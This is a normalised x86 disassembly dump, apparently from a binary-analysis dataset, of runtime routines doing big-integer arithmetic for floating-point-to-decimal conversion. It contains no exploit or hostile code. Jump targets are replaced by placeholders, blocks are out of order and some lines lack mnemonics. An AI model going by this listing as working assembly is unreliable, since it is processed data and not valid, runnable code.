mov eax [ ebx ]
cmp eax 0x73
jae r-xdata
push 0x0
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push eax
push 0x1cc
push edx
mov [ ebx ] 0x0
call sub_442e6b
add esp 0x10
xor al al
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
mov [ ebx + eax * 4 + 0x4 ] esi
mov al 0x1
inc [ ebx ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
cmp ecx 0x73
je r-xdata
mov eax [ ebp - 0x1dc ]
mov eax [ eax + edi * 4 ]
mul [ ebp - 0x1ec ]
add eax esi
adc edx 0x0
add [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc edi
inc ecx
mov esi edx
mov edx [ ebp - 0x1d4 ]
cmp edi [ ebp - 0x1e4 ]
jne r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp + ecx * 4 - 0x1d0 ] 0x0
add eax edi
mov [ ebp - 0x1d4 ] eax
push 0x0
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push eax
push 0x1cc
push esi
mov [ ebx ] 0x0
call sub_442e6b
add esp 0x10
xor al al
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
mov [ ebx + eax * 4 + 0x4 ] edi
mov al 0x1
inc [ ebx ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
cmp ecx edx
jne r-xdata
mov eax esi
xor esi esi
add [ ebp + ecx * 4 - 0x1d0 ] eax
mov edx [ ebp - 0x1d4 ]
adc esi esi
inc ecx
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp + ecx * 4 - 0x1d0 ] 0x0
mov [ ebp - 0x1d4 ] eax
sub_4412b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x1d8
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1d4 ]
push edi
push ecx
push 0x1cc
mov [ eax ] edi
add eax 0x4
push eax
mov [ ebp - 0x1d8 ] edi
call sub_442e6b
add esp 0x10
mov al 0x1
pop edi
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test eax eax
je r-xdata
push ebx
lea edx [ ecx + 0x4 ]
xor ebx ebx
push esi
mov [ ebp - 0x4 ] edx
xor esi esi
mov ecx eax
lea ebx [ ebx ]
mov eax edi
mul [ edx + esi * 4 ]
add eax ebx
adc edx 0x0
mov ebx edx
mov edx [ ebp - 0x4 ]
mov [ edx + esi * 4 ] eax
inc esi
cmp esi ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
mov al 0x1
pop edi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
cmp eax 0x73
jae r-xdata
push 0x0
lea eax [ ebp - 0x1d4 ]
mov [ ebp - 0x1d8 ] 0x0
push eax
push 0x1cc
push edx
mov [ ecx ] 0x0
call sub_442e6b
add esp 0x10
xor al al
pop esi
pop ebx
pop edi
mov esp ebp
pop ebp
retn
mov [ ecx + eax * 4 + 0x4 ] ebx
inc [ ecx ]
sub_4413a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax 0xcccccccd
mul [ ebp + 0xc ]
push ebx
mov ecx edx
shr ecx 0x3
push esi
mov eax ecx
mov [ ebp - 0x3b8 ] ecx
mov [ ebp - 0x3bc ] eax
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x3a8 ] edi
test eax eax
je r-xdata
lea eax [ ecx + ecx * 4 ]
mov ecx [ ebp + 0xc ]
add eax eax
sub ecx eax
je r-xdata
mov ecx 0x26
lea esp [ esp ]
pop edi
pop esi
mov al 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ebx [ ecx * 4 + r--data ]
test ebx ebx
jne r-xdata
mov edi [ ebp - 0x3a8 ]
mov edx [ edi ]
lea esi [ edi + 0x4 ]
mov [ ebp - 0x3b4 ] edx
cmp edx 0x1
ja r-xdata
mov edi [ ebp - 0x1d0 ]
test edi edi
jne r-xdata
cmp ebx 0x1
je r-xdata
push ebx
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] ebx
push eax
lea eax [ edi + 0x4 ]
mov [ edi ] ebx
push 0x1cc
push eax
call sub_442e6b
add esp 0x10
cmp ecx edx
setb al
test al al
je r-xdata
mov ebx [ esi ]
lea eax [ ecx * 4 ]
push eax
lea eax [ ebp - 0x1d0 ]
mov [ edi ] ecx
push eax
push 0x1cc
push esi
call sub_442e6b
add esp 0x10
test ebx ebx
jne r-xdata
cmp edi 0x1
jne r-xdata
mov [ ebp - 0x3a4 ] edi
lea eax [ ebp - 0x3a0 ]
mov edi [ ebp - 0x3a8 ]
push 0x0
push eax
push 0x1cc
lea eax [ edi + 0x4 ]
mov [ edi ] 0x0
push eax
call sub_442e6b
add esp 0x10
jmp r-xdata
mov eax [ edi ]
mov [ ebp - 0x3b8 ] eax
test eax eax
je r-xdata
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x3b4 ] ecx
mov [ ebp - 0x3c0 ] eax
mov eax edx
mov [ ebp - 0x3c0 ] esi
mov eax ecx
lea esi [ ebp - 0x1d0 ]
jmp r-xdata
cmp ebx 0x1
je r-xdata
push ebx
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] ebx
push eax
push 0x1cc
push esi
mov [ edi ] ebx
call sub_442e6b
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x3a8 ]
mov ebx [ eax ]
test ebx ebx
jne r-xdata
mov edi [ ebp - 0x3a8 ]
jmp r-xdata
mov al 0x1
lea edx [ edi + 0x4 ]
xor esi esi
mov [ ebp - 0x3b0 ] edx
xor ecx ecx
mov edi eax
mov [ edi ] edx
shl edx 0x2
test edx edx
je r-xdata
lea eax [ ebp - 0x3a0 ]
sub esi eax
mov [ ebp - 0x3c8 ] esi
lea ecx [ ecx ]
xor edx edx
mov [ ebp - 0x3ac ] eax
xor ebx ebx
mov [ ebp - 0x3a4 ] edx
test eax eax
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x3ac ] eax
test eax eax
je r-xdata
xor esi esi
lea edx [ eax + 0x4 ]
xor ecx ecx
lea ebx [ ebx ]
mov edi eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push eax
lea eax [ edi + 0x4 ]
mov [ edi ] 0x0
push 0x1cc
push eax
call sub_442e6b
add esp 0x10
xor al al
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x3bc ]
mov ecx 0x26
sub eax [ ebp - 0x3b0 ]
mov [ ebp - 0x3bc ] eax
jne r-xdata
mov eax ebx
mul [ edx + ecx * 4 ]
add eax esi
adc edx 0x0
mov esi edx
mov edx [ ebp - 0x3b0 ]
mov [ edx + ecx * 4 ] eax
inc ecx
cmp ecx edi
jne r-xdata
mov edi [ ebp - 0x3a8 ]
test esi esi
je r-xdata
lea eax [ edi + 0x4 ]
test eax eax
jne r-xdata
xor esi esi
xor edi edi
mov ecx ebx
cmp [ ebp - 0x3b4 ] esi
je r-xdata
cmp ebx edx
jne r-xdata
xor edi edi
xor ecx ecx
mov eax edi
mov edi [ ebp - 0x1d0 ]
mul [ edx + ecx * 4 ]
add eax esi
adc edx 0x0
mov esi edx
mov edx [ ebp - 0x3a8 ]
add edx 0x4
mov [ edx + ecx * 4 ] eax
inc ecx
cmp ecx ebx
jne r-xdata
mov edi [ ebp - 0x3a8 ]
test esi esi
je r-xdata
cmp eax 0x26
mov ebx eax
cmova ebx ecx
mov [ ebp - 0x3b0 ] ebx
movzx ecx [ ebx * 4 + r--data ]
movzx esi [ ebx * 4 + r--data ]
lea edi [ ecx * 4 ]
lea eax [ ecx + esi ]
push edi
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x1d0 ]
push 0x0
push eax
call sub_40dea0
lea eax [ esi * 4 ]
push eax
movzx eax [ ebx * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x1d0 ]
add eax edi
push eax
call sub_40d920
mov ecx [ ebp - 0x1d4 ]
add esp 0x18
cmp ecx 0x1
ja r-xdata
mov ecx [ ebp - 0x3b8 ]
mov eax [ edi ]
cmp eax 0x73
jae r-xdata
cmp edx 0x1cc
ja r-xdata
call sub_430f56
mov [ eax ] 0x16
jmp r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc ebx
cmp ebx [ ebp - 0x3ac ]
jne r-xdata
lea edx [ ebx + 0x1 ]
mov [ ebp + ebx * 4 - 0x3a0 ] eax
mov [ ebp - 0x3a4 ] edx
jmp r-xdata
mov eax ebx
mul [ esi + ecx * 4 ]
add eax edi
mov [ esi + ecx * 4 ] eax
adc edx 0x0
inc ecx
mov edi edx
cmp ecx [ ebp - 0x3ac ]
jne r-xdata
test edi edi
je r-xdata
mov eax [ edi ]
cmp eax 0x73
jae r-xdata
push 0x0
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push eax
push 0x1cc
push edx
mov [ edi ] 0x0
call sub_442e6b
mov ecx [ ebp - 0x4 ]
add esp 0x10
xor ecx ebp
xor al al
pop edi
pop esi
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov [ edi + eax * 4 + 0x4 ] esi
mov al 0x1
inc [ edi ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
push 0x1cc
push 0x0
push eax
call sub_40dea0
add esp 0xc
call sub_430f56
mov [ eax ] 0x22
push edx
lea ecx [ ebp - 0x3a0 ]
push ecx
push eax
call sub_40d920
add esp 0xc
jmp r-xdata
call sub_430e30
mov edi [ ebp - 0x3a8 ]
xor al al
mov [ edi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x3c8 ]
test esi esi
je r-xdata
cmp ecx edx
jne r-xdata
lea eax [ esi + ebx * 4 ]
mov eax [ ebp + eax - 0x3a0 ]
mov [ ebp - 0x3c4 ] eax
test eax eax
jne r-xdata
mov edi [ ebp - 0x3a8 ]
mov ecx [ ebp - 0x3a8 ]
mov eax [ ecx ]
cmp eax 0x73
jae r-xdata
push 0x0
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push eax
push 0x1cc
push edx
mov [ edi ] 0x0
call sub_442e6b
add esp 0x10
xor al al
jmp r-xdata
mov [ edi + eax * 4 + 0x4 ] esi
inc [ edi ]
jmp r-xdata
test al al
je r-xdata
lea ecx [ ecx ]
mov eax [ ebp - 0x3c0 ]
mov eax [ eax + edi * 4 ]
mul [ ebp - 0x3c4 ]
add eax esi
adc edx 0x0
add eax [ ebp + ecx * 4 - 0x3a0 ]
mov [ ebp + ecx * 4 - 0x3a0 ] eax
adc edx 0x0
inc edi
inc ecx
mov esi edx
mov edx [ ebp - 0x3a4 ]
cmp edi [ ebp - 0x3b4 ]
jne r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp + ecx * 4 - 0x3a0 ] 0x0
add eax edi
mov [ ebp - 0x3a4 ] eax
push 0x0
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push eax
mov edi ecx
push 0x1cc
push esi
mov [ edi ] 0x0
call sub_442e6b
add esp 0x10
xor al al
jmp r-xdata
mov [ ecx + eax * 4 + 0x4 ] edi
mov edi ecx
inc [ edi ]
jmp r-xdata
cmp ecx edx
jne r-xdata
mov eax esi
xor esi esi
add eax [ ebp + ecx * 4 - 0x3a0 ]
mov [ ebp + ecx * 4 - 0x3a0 ] eax
mov edx [ ebp - 0x3a4 ]
adc esi esi
inc ecx
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp + ecx * 4 - 0x3a0 ] 0x0
mov [ ebp - 0x3a4 ] eax
cmp ecx 0x73
je r-xdata
sub_441940
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
xor ecx ecx
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
lea esp [ esp ]
mov eax ebx
mul [ edx + ecx * 4 ]
add eax esi
adc edx 0x0
mov esi edx
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] eax
inc ecx
cmp ecx edi
jne r-xdata
pop ebx
sub_441980
mov edi edi
push ebp
mov ebp esp
sub esp 0x1ec
push ebx
mov ebx [ ebp + 0xc ]
xor edx edx
push esi
mov eax ebx
mov esi 0x20
shr eax 0x5
and ebx 0x1f
mov ecx esi
mov [ ebp - 0xc ] eax
sub ecx ebx
mov [ ebp + 0xc ] ebx
push edi
lea eax [ esi - 0x1f ]
mov [ ebp - 0x1c ] ecx
call sub_448df0
mov edx [ ebp + 0x8 ]
dec eax
mov [ ebp - 0x18 ] eax
not eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
mov edi [ edx ]
mov ecx [ edx + edi * 4 ]
bsr eax ecx
je r-xdata
xor eax eax
inc eax
jmp r-xdata
xor bl bl
test bl bl
je r-xdata
mov ecx [ ebp - 0xc ]
sub esi eax
cmp ebx esi
seta bl
lea eax [ edi + ecx ]
mov [ ebp - 0x1 ] bl
cmp eax 0x73
seta bh
cmp eax 0x73
jne r-xdata
push 0x0
lea eax [ ebp - 0x1e8 ]
mov [ ebp - 0x1ec ] 0x0
push eax
lea eax [ edx + 0x4 ]
mov [ edx ] 0x0
push 0x1cc
push eax
call sub_442e6b
add esp 0x10
xor al al
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test bl bl
jne r-xdata
mov bl 0x1
jmp r-xdata
mov esi 0x72
cmp eax esi
cmovb esi eax
mov [ ebp - 0x8 ] esi
mov ebx esi
cmp esi 0xffffffff
je r-xdata
test bh bh
jne r-xdata
test ecx ecx
je r-xdata
sub esi ecx
lea edi [ edx + 0x4 ]
mov eax ebx
inc eax
lea edi [ edi + esi * 4 ]
lea eax [ edx + eax * 4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
lea edi [ edx + 0x4 ]
xor eax eax
[ edi ]
mov esi [ ebp - 0x8 ]
mov ecx [ edx ]
cmp esi ecx
jae r-xdata
pop edi
mov [ edx ] esi
mov al 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc esi
xor edx edx
mov edx [ edi ]
jmp r-xdata
xor eax eax
mov eax [ edi - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ecx
jae r-xdata
cmp ebx ecx
jb r-xdata
and eax [ ebp - 0x14 ]
dec ebx
mov ecx [ ebp - 0x1c ]
dec esi
and edx [ ebp - 0x18 ]
sub edi 0x4
shr eax cl
mov ecx [ ebp + 0xc ]
shl edx cl
mov ecx [ ebp - 0x10 ]
or eax edx
mov edx [ ebp + 0x8 ]
mov [ ecx ] eax
sub ecx 0x4
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0xc ]
cmp ebx 0xffffffff
jne r-xdata
sub_441acf
mov edi edi
push ebp
mov ebp esp
sub esp 0x964
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x18 ]
lea ecx [ ebp - 0x794 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x780 ] edi
mov [ ebp - 0x77c ] ebx
call sub_440819
mov esi [ ebp + 0xc ]
xor eax eax
mov ecx esi
and ecx 0x80000000
or eax ecx
mov al 0x2d
jne r-xdata
movsx eax al
mov ecx esi
mov [ edi ] eax
and ecx 0x7ff00000
xor eax eax
mov [ edi + 0x8 ] ebx
or eax ecx
mov edi [ ebp + 0x8 ]
jne r-xdata
add al 0xf3
lea eax [ ebp + 0x8 ]
push eax
call sub_434c02
pop ecx
test eax eax
je r-xdata
mov ecx esi
mov eax edi
and ecx 0xfffff
or eax ecx
jne r-xdata
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x780 ]
mov [ ecx + 0x4 ] 0x1
mov eax [ ebp - 0x780 ]
push r--data
and [ eax + 0x4 ] 0x0
jmp r-xdata
push r--data
sub eax 0x1
je r-xdata
push [ ebp + 0x1c ]
push ebx
call sub_42d2ce
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
cmp [ ebp - 0x78c ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
push r--data
jmp r-xdata
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x794 ]
push eax
call sub_44607a
pop ecx
push r--data
jmp r-xdata
sub eax 0x1
je r-xdata
push r--data
jmp r-xdata
mov eax [ ebp + 0x10 ]
and esi 0x7fffffff
and [ ebp - 0x784 ] 0x0
inc eax
mov [ ebp + 0x8 ] edi
mov [ ebp + 0xc ] esi
fld [ ebp + 0x8 ]
fst [ ebp - 0x768 ]
mov edi [ ebp - 0x764 ]
mov ecx edi
mov [ ebp - 0x778 ] eax
shr ecx 0x14
mov eax ecx
and eax 0x7ff
or eax 0x0
jne r-xdata
xor dl dl
mov esi 0x100000
xor eax eax
mov dl 0x1
xor esi esi
jmp r-xdata
xor eax eax
mov [ ebp - 0x76c ] eax
cmp eax 0x80000000
jne r-xdata
mov ebx [ ebp - 0x768 ]
and edi 0xfffff
add ebx eax
adc edi esi
xor eax eax
test dl dl
setne al
and ecx 0x7ff
inc eax
lea esi [ ecx - 0x434 ]
add esi eax
mov [ ebp - 0x74c ] esi
call sub_446160
push ecx
push ecx
fstp [ esp ]
call sub_446270
pop ecx
pop ecx
call sub_448e10
mov [ ebp - 0x76c ] eax
cmp eax 0x7fffffff
je r-xdata
cmp esi 0xfffffc02
je r-xdata
and [ ebp - 0x570 ] 0x0
push 0x2
pop esi
mov [ ebp - 0x56c ] 0x100000
mov [ ebp - 0x574 ] esi
cmp ebx esi
jne r-xdata
mov [ ebp - 0x1d0 ] ebx
xor ebx ebx
test edi edi
mov [ ebp - 0x1cc ] edi
setne bl
inc ebx
mov [ ebp - 0x1d4 ] ebx
test esi esi
js r-xdata
mov eax [ ebp + ebx * 4 - 0x1d4 ]
and [ ebp - 0x764 ] 0x0
bsr eax eax
je r-xdata
and [ ebp - 0x570 ] 0x0
push 0x2
pop ecx
mov [ ebp - 0x56c ] 0x100000
mov [ ebp - 0x574 ] ecx
cmp ebx ecx
jne r-xdata
mov eax [ ebp - 0x74c ]
xor edx edx
inc eax
mov edi eax
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov [ ebp - 0x750 ] eax
xor eax eax
shr edi 0x5
inc eax
mov [ ebp - 0x74c ] edi
mov [ ebp - 0x770 ] ecx
call sub_448df0
mov ecx [ ebp + ebx * 4 - 0x1d4 ]
dec eax
and [ ebp - 0x764 ] 0x0
bsr ecx ecx
mov [ ebp - 0x758 ] eax
not eax
mov [ ebp - 0x774 ] eax
je r-xdata
xor ecx ecx
xor ecx ecx
lea ecx [ eax + 0x1 ]
jmp r-xdata
xor edx edx
xor ecx ecx
inc ecx
jmp r-xdata
add ecx 0x4
cmp ecx 0x8
jne r-xdata
xor al al
test al al
je r-xdata
push 0x20
pop eax
sub eax ecx
cmp eax 0x1
setb al
cmp ebx 0x73
mov [ ebp - 0x745 ] al
seta cl
cmp ebx 0x73
jne r-xdata
add edx 0x4
cmp edx 0x8
jne r-xdata
xor al al
test al al
je r-xdata
push 0x20
pop eax
sub eax ecx
lea edx [ ebx + edi ]
cmp [ ebp - 0x750 ] eax
mov [ ebp - 0x760 ] edx
seta al
cmp edx 0x73
mov [ ebp - 0x745 ] al
seta cl
cmp edx 0x73
jne r-xdata
mov eax [ ebp + ecx - 0x570 ]
cmp eax [ ebp + ecx - 0x1d0 ]
jne r-xdata
mov eax [ ebp - 0x74c ]
xor edx edx
add eax 0x2
mov esi eax
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov [ ebp - 0x75c ] eax
xor eax eax
shr esi 0x5
inc eax
mov [ ebp - 0x750 ] esi
mov [ ebp - 0x770 ] ecx
call sub_448df0
and [ ebp - 0x764 ] 0x0
dec eax
bsr ecx edi
mov [ ebp - 0x758 ] eax
not eax
mov [ ebp - 0x774 ] eax
je r-xdata
and [ ebp - 0x574 ] 0x0
lea eax [ ebp - 0x570 ]
and [ ebp - 0x1d4 ] 0x0
push 0x0
push eax
lea eax [ ebp - 0x1d0 ]
push 0x1cc
push eax
call sub_442e6b
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + edx - 0x570 ]
cmp eax [ ebp + edx - 0x1d0 ]
jne r-xdata
and [ ebp - 0x764 ] 0x0
bsr eax edi
je r-xdata
xor eax eax
mov ebx 0x1cc
push eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
xor ecx ecx
inc ecx
jmp r-xdata
neg eax
div ecx
mov [ ebp - 0x754 ] eax
mov ecx edx
mov [ ebp - 0x758 ] ecx
test eax eax
je r-xdata
div ecx
mov [ ebp - 0x770 ] eax
mov ecx edx
mov [ ebp - 0x764 ] ecx
test eax eax
je r-xdata
push 0x72
pop ecx
cmp ebx ecx
jae r-xdata
test cl cl
jne r-xdata
xor edx edx
lea edx [ eax + 0x1 ]
jmp r-xdata
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
jmp r-xdata
push 0x72
pop ecx
cmp edx ecx
jb r-xdata
test cl cl
jne r-xdata
xor al al
test al al
je r-xdata
push 0x20
pop eax
sub eax ecx
lea edx [ esi + 0x2 ]
cmp [ ebp - 0x75c ] eax
mov [ ebp - 0x754 ] edx
seta al
cmp edx 0x73
mov [ ebp - 0x745 ] al
seta cl
cmp edx 0x73
jne r-xdata
test ecx ecx
je r-xdata
cmp eax 0x26
jbe r-xdata
test ecx ecx
je r-xdata
cmp eax 0x26
jbe r-xdata
cmp ecx 0xffffffff
je r-xdata
mov ecx ebx
and [ ebp - 0x750 ] 0x0
mov edx [ edi ]
mov [ ebp - 0x750 ] edx
jmp r-xdata
push 0x20
pop eax
sub eax edx
mov esi ecx
cmp eax ecx
lea eax [ ebp - 0x1c8 ]
mov [ ebp - 0x754 ] eax
mov edi eax
setb [ ebp - 0x745 ]
mov eax [ ebp - 0x76c ]
xor edx edx
push 0xa
pop ecx
mov [ ebp - 0x774 ] ecx
test eax eax
js r-xdata
mov eax edx
mov [ ebp - 0x754 ] eax
cmp edx 0xffffffff
je r-xdata
mov edx ecx
mov [ ebp - 0x760 ] ecx
xor eax eax
mov ebx 0x1cc
push eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
mov edi [ ebp - 0x77c ]
mov esi edi
mov ecx [ ebp - 0x1d4 ]
mov [ ebp - 0x74c ] esi
test ecx ecx
je r-xdata
mov eax [ ecx * 4 + r--data ]
mov [ ebp - 0x764 ] eax
test eax eax
je r-xdata
movzx ecx [ eax * 4 + r--data ]
movzx esi [ eax * 4 + r--data ]
mov edi ecx
mov [ ebp - 0x74c ] eax
shl edi 0x2
push edi
lea eax [ ecx + esi ]
mov [ ebp - 0x574 ] eax
lea eax [ ebp - 0x570 ]
push 0x0
push eax
call sub_40dea0
mov eax esi
shl eax 0x2
push eax
mov eax [ ebp - 0x74c ]
movzx eax [ eax * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x570 ]
add eax edi
push eax
call sub_40d920
mov ecx [ ebp - 0x574 ]
add esp 0x18
mov [ ebp - 0x760 ] ecx
cmp ecx 0x1
ja r-xdata
push 0x26
pop eax
mov edi [ ecx * 4 + r--data ]
test edi edi
jne r-xdata
movzx ecx [ eax * 4 + r--data ]
movzx esi [ eax * 4 + r--data ]
mov edi ecx
mov [ ebp - 0x75c ] eax
shl edi 0x2
push edi
lea eax [ ecx + esi ]
mov [ ebp - 0x574 ] eax
lea eax [ ebp - 0x570 ]
push 0x0
push eax
call sub_40dea0
mov eax esi
shl eax 0x2
push eax
mov eax [ ebp - 0x75c ]
movzx eax [ eax * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x570 ]
add eax edi
push eax
call sub_40d920
mov ecx [ ebp - 0x574 ]
add esp 0x18
mov [ ebp - 0x760 ] ecx
cmp ecx 0x1
ja r-xdata
push 0x26
pop eax
cmp [ ebp - 0x745 ] 0x0
je r-xdata
lea edi [ ebp - 0x1d0 ]
mov esi ecx
lea edi [ edi + ecx * 4 ]
mov [ ebp - 0x754 ] edi
xor edx edx
mov edx [ edi - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
test edi edi
je r-xdata
mov esi edx
lea ecx [ ebp - 0x1d0 ]
mov edx [ ebp - 0x74c ]
sub esi edx
lea ecx [ ecx + esi * 4 ]
mov [ ebp - 0x75c ] ecx
push 0x72
pop ecx
cmp edx ecx
jb r-xdata
test cl cl
jne r-xdata
lea eax [ ebp - 0x3a4 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_4409b0
pop ecx
pop ecx
push 0xa
pop edx
cmp eax edx
jne r-xdata
xor esi esi
xor edi edi
xor eax eax
push eax
mov [ ebp - 0x1d4 ] eax
mov [ ebp - 0x964 ] eax
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x1d4 ] 0x1
ja r-xdata
mov edi [ ebp - 0x570 ]
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
jmp r-xdata
cmp [ ebp - 0x3a4 ] 0x1
ja r-xdata
mov edi [ ebp - 0x570 ]
test edi edi
jne r-xdata
mov [ ebp - 0x1d4 ] ecx
jmp r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
and [ ebp - 0x750 ] 0x0
mov edx [ edi ]
mov [ ebp - 0x750 ] edx
jmp r-xdata
xor eax eax
cmp [ ebp - 0x745 ] al
setne al
add eax ecx
sub ecx [ ebp - 0x74c ]
mov edi ecx
mov [ ebp - 0x1d4 ] eax
shr edi 0x5
lea eax [ ebp - 0x570 ]
mov esi edi
mov [ ebp - 0x758 ] ecx
shl esi 0x2
push esi
push 0x0
push eax
call sub_40dea0
mov ecx [ ebp - 0x758 ]
xor eax eax
inc eax
and ecx 0x1f
shl eax cl
mov [ ebp + esi - 0x570 ] eax
lea eax [ edi + 0x1 ]
jmp r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
mov eax [ ebp - 0x750 ]
sub edi 0x4
shl eax 0x2
shr edx 0x1e
xor edx eax
mov eax [ ebp - 0x754 ]
dec esi
mov [ eax ] edx
sub eax 0x4
mov [ ebp - 0x754 ] eax
cmp esi 0xffffffff
je r-xdata
cmp [ ebp - 0x745 ] 0x0
mov ebx 0x1cc
je r-xdata
mov ecx edi
xor eax eax
lea edi [ ebp - 0x1d0 ]
[ edi ]
mov edx [ ebp - 0x760 ]
mov edi [ ebp - 0x74c ]
push 0x2
pop esi
cmp esi ebx
jae r-xdata
mov ecx edx
mov [ ebp - 0x760 ] ecx
cmp edx 0xffffffff
je r-xdata
mov edx ecx
mov [ ebp - 0x754 ] ecx
test eax eax
jne r-xdata
inc [ ebp - 0x76c ]
lea esi [ edi + 0x1 ]
mov eax [ ebp - 0x3a4 ]
mov [ edi ] 0x31
mov [ ebp - 0x74c ] esi
test eax eax
je r-xdata
mov eax [ ebp + edi * 4 - 0x1d0 ]
push 0xa
pop edx
mul edx
add eax esi
mov [ ebp + edi * 4 - 0x1d0 ] eax
adc edx 0x0
inc edi
mov esi edx
cmp edi ecx
jne r-xdata
mov [ ebp - 0x764 ] esi
test esi esi
mov esi [ ebp - 0x74c ]
je r-xdata
mov ecx [ ebp - 0x1d4 ]
test ecx ecx
je r-xdata
cmp ecx [ ebp - 0x1d4 ]
lea edi [ ebp - 0x570 ]
setb al
test al al
jne r-xdata
mov edi [ ebp - 0x1d0 ]
mov eax ecx
shl eax 0x2
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x1d4 ] ecx
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
test edi edi
je r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x1d4 ] eax
push eax
lea eax [ ebp - 0x960 ]
jmp r-xdata
